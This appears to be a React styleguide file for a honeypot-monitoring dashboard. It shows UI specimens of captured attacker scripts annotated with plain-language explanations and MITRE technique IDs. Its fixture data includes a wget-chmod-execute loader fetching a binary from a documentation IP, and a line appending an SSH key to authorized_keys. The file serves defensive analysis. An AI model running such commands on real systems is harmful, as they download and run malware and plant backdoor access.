/* eslint-disable react-refresh/only-export-components -- a styleguide section exports its descriptor (see registry.ts). */
import { ExplainedLines } from "@/components/scripts/explained-lines"
import { ScriptRow } from "@/components/scripts/script-row"
import type { ExplainedLine, ScriptItem } from "@/lib/scripts"
import type { FeatureSection } from "./registry"
import { Section, Specimen } from "./parts"

/* Fictional specimens: documentation addresses, example hosts, no real key material. */

const ago = (h: number) => new Date(Date.now() - h * 3_600_000).toISOString()

const ROW: ScriptItem = {
  id: 1,
  fingerprint: "a3f1".repeat(16),
  summary: "A 3-step script that downloads a file, makes it executable and runs it.",
  preview: ["wget http://203.0.113.50/bins/x86", "chmod 777 x86", "./x86 ssh.exploit"],
  line_count: 3,
  first_seen: ago(200),
  last_seen: ago(0.4),
  sessions: 1212,
  sources: 61,
  sensors: ["ssh", "telnet"],
  techniques: ["T1105", "T1222.002", "T1059.004"],
  campaign_id: 41,
  campaign_name: "Mirai loader over Telnet #41",
  risk: "severe",
  is_new: true,
}

const LINES: ExplainedLine[] = [
  {
    n: 1,
    text: "wget <url>",
    raw: "wget http://203.0.113.50/bins/x86",
    explanation: "Downloads a file from another server.",
    risk: "severe",
    technique: "T1105",
    technique_name: "Ingress Tool Transfer",
    rule: "download",
  },
  {
    n: 2,
    text: "echo <key> >> ~/.ssh/authorized_keys",
    raw: `echo 'ssh-rsa AAAAB3NzaC1yc2E${"ExampleOnlyNotARealKey0123456789".repeat(4)} user@example' >> ~/.ssh/authorized_keys`,
    explanation: "Adds the attacker's SSH key so they can log in again later without a password.",
    risk: "warning",
    technique: "T1098.004",
    technique_name: "SSH Authorized Keys",
    rule: "ssh-key-install",
  },
  {
    n: 3,
    text: "uname -a",
    raw: "uname -a",
    explanation: "Shows the operating system, kernel and CPU architecture.",
    risk: "info",
    technique: "T1082",
    technique_name: "System Information Discovery",
    rule: "uname",
  },
  {
    n: 4,
    text: "frobnicate --now",
    raw: "frobnicate --now",
    explanation: "No built-in explanation for this command yet.",
    risk: null,
    technique: null,
    technique_name: null,
    rule: null,
  },
]

function ScriptsSection() {
  return (
    <Section
      id="scripts"
      title="Scripts"
      description="A script is one story: what it does in plain words first, the commands second. Prose uses normal-nums so hyphens stay narrow."
    >
      <div className="space-y-4">
        <Specimen label="ScriptRow">
          <div className="w-full overflow-hidden rounded-md border">
            <ScriptRow item={ROW} />
          </div>
        </Specimen>
        <Specimen label="ExplainedLines: severe, warning, info (no badge), unexplained, long line">
          <div className="w-full">
            <ExplainedLines lines={LINES} />
          </div>
        </Specimen>
      </div>
    </Section>
  )
}

export const section: FeatureSection = {
  id: "scripts",
  label: "Scripts",
  order: 30,
  Component: ScriptsSection,
}
